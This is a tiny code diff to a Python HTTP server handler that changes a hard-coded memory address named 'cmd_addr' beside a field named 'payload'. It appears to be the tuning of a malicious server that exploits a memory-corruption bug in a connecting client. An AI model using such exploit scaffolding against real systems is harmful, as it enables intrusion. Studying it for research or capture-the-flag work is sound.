@@ -10,7 +10,7 @@ class HttpHandler(BaseHTTPRequestHandler):
 
     protocol_version = "HTTP/1.1"
     payload  = "leg"
-    cmd_addr = 0xbeffc104+396
+    cmd_addr = 0xbeffc0c4+396
     
     def version_string(self) -> str:
         return "circled.server"
